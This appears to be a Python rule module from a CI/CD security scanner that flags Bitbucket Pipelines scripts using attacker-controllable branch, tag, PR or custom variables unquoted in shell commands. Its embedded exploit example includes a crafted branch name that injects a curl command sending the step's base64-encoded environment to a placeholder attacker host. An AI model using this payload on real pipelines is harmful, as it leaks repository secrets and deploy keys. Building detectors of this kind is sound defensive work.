"""BB-002, scripts must not interpolate $BITBUCKET_* ref/PR variables."""
from __future__ import annotations

import re
from typing import Any

from ..._primitives.tainted_variables import (
    has_direct_taint,
    has_unsafe_reference,
)
from ..._yaml_lines import line_of as _line_of
from ...base import Finding, Location, Severity
from ...rule import Rule
from ..base import iter_steps, step_scripts
from ._helpers import UNTRUSTED_VAR_RE

RULE = Rule(
    id="BB-002",
    title="Script injection via attacker-controllable context",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4",),
    esf=("ESF-D-INJECTION",),
    cwe=("CWE-78",),
    recommendation=(
        "Always double-quote interpolations of ref-derived variables "
        "(`\"$BITBUCKET_BRANCH\"`). Avoid passing them to `eval`, "
        "`sh -c`, or unquoted command arguments."
    ),
    docs_note=(
        "$BITBUCKET_BRANCH, $BITBUCKET_TAG, and $BITBUCKET_PR_* are "
        "populated from SCM event metadata the attacker controls. "
        "Interpolating them unquoted into a shell command lets a "
        "crafted branch or tag name can execute inline. The same "
        "applies to trigger-time ``variables:`` declared by a "
        "``custom:`` pipeline: anyone with run / trigger rights supplies "
        "the value (UI or API), so an unquoted reference in a later "
        "``script:`` step is injection (the Bitbucket analogue of a "
        "workflow_dispatch input)."
    ),
    known_fp=(
        "Pipelines that *parse* a ref name rather than execute it "
        "(``echo \"$BITBUCKET_BRANCH\" | cut -d/ -f2``) still "
        "interpolate the variable but expose no shell-execution "
        "surface for the value. The rule has no AST-level "
        "understanding of the surrounding shell context, so a "
        "well-quoted use that happens to live near an unrelated "
        "``$(...)`` substitution can read as an offender. "
        "Suppress per-step via ``--ignore-file`` if the value is "
        "only consumed as data.",
    ),
    exploit_example=(
        "# Vulnerable: branch name interpolated unquoted into shell.\n"
        "image: alpine:latest\n"
        "pipelines:\n"
        "  pull-requests:\n"
        "    '**':\n"
        "      - step:\n"
        "          name: triage\n"
        "          script:\n"
        "            - echo Building $BITBUCKET_BRANCH\n"
        "            - ./scripts/build.sh $BITBUCKET_BRANCH\n"
        "\n"
        "# Attack: open a PR from a branch whose name is shell:\n"
        "#\n"
        "#   git checkout -b 'foo;curl https://attacker/x \\\n"
        "#     -d \"$(env|base64)\";:'\n"
        "#\n"
        "# Bitbucket substitutes ``$BITBUCKET_BRANCH`` literally before\n"
        "# the shell parses the line, so the `;` becomes a command\n"
        "# separator and the curl exfils the step's env (which holds\n"
        "# every repository / workspace variable in scope, including\n"
        "# deploy keys configured for the pipeline).\n"
        "\n"
        "# Safe: double-quote and pass via env so the value is only\n"
        "# consumed as data.\n"
        "      - step:\n"
        "          name: triage\n"
        "          script:\n"
        "            - echo \"Building $BRANCH\"\n"
        "            - ./scripts/build.sh \"$BRANCH\"\n"
        "          # Bitbucket has no declarative env block; assign\n"
        "          # via shell so the value is captured as a single\n"
        "          # argv element from the controlled assignment.\n"
        "          # (Equivalent: BRANCH=\"$BITBUCKET_BRANCH\"; ...)"
    ),
)

# Captures the assigned name in ``export VAR=...`` or ``VAR=...`` lines.
_EXPORT_RE = re.compile(r"(?:export\s+)?(\w+)=")


def _tainted_exports(lines: list[str]) -> set[str]:
    """Return shell variable names assigned from untrusted BITBUCKET_* values.

    Bitbucket has no declarative variables block, taint sources are
    scraped from inline ``export`` / bare-assignment statements in the
    script body itself.
    """
    tainted: set[str] = set()
    for line in lines:
        m = _EXPORT_RE.match(line.strip())
        if m and UNTRUSTED_VAR_RE.search(line):
            tainted.add(m.group(1))
    return tainted


def _bb_ref_pattern(name: str) -> str:
    """Match Bitbucket shell reference syntax for *name*: ``$VAR`` / ``${VAR}``."""
    return rf"\$\{{?{re.escape(name)}\}}?"


def _custom_pipeline_vars(doc: dict[str, Any]) -> set[str]:
    """Names of trigger-time ``variables:`` declared by a ``custom:`` pipeline.

    A custom pipeline can declare ``- variables: [{name: X}]`` entries that
    anyone with run / trigger rights supplies at run time (UI or API), so
    they are attacker-controllable the same way a workflow_dispatch input
    is. Unquoted use in a later ``script:`` step is injection.
    """
    names: set[str] = set()
    pipelines = doc.get("pipelines")
    custom = pipelines.get("custom") if isinstance(pipelines, dict) else None
    if not isinstance(custom, dict):
        return names
    for items in custom.values():
        if not isinstance(items, list):
            continue
        for item in items:
            if isinstance(item, dict) and isinstance(item.get("variables"), list):
                for v in item["variables"]:
                    if isinstance(v, dict) and isinstance(v.get("name"), str):
                        names.add(v["name"])
    return names


def check(path: str, doc: dict[str, Any]) -> Finding:
    offenders: list[str] = []
    locations: list[Location] = []
    custom_vars = _custom_pipeline_vars(doc)
    for loc, step in iter_steps(doc):
        scripts = step_scripts(step)
        hit = False
        # 1. Direct interpolation of untrusted predefined vars.
        if has_direct_taint(scripts, UNTRUSTED_VAR_RE):
            offenders.append(loc)
            hit = True
        else:
            # 2. Indirect: script exports tainted value into a local
            #    var then references that var unquoted later.
            tainted = _tainted_exports(scripts)
            if tainted and has_unsafe_reference(
                scripts, tainted, ref_pattern=_bb_ref_pattern
            ):
                offenders.append(loc)
                hit = True
            # 3. A custom-pipeline trigger-time variable referenced unquoted.
            elif custom_vars and has_unsafe_reference(
                scripts, custom_vars, ref_pattern=_bb_ref_pattern
            ):
                offenders.append(loc)
                hit = True
        if hit:
            line = _line_of(step) if isinstance(step, dict) else None
            locations.append(Location(
                path=path, start_line=line, end_line=line,
            ))
    passed = not offenders
    desc = (
        "No script interpolates attacker-controllable ref / PR variables."
        if passed else
        f"Script(s) in step(s) {', '.join(sorted(set(offenders)))} "
        f"interpolate $BITBUCKET_BRANCH / $BITBUCKET_TAG / "
        f"$BITBUCKET_PR_* directly or via exported variables into "
        f"shell commands. A crafted branch or tag name can execute inline."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
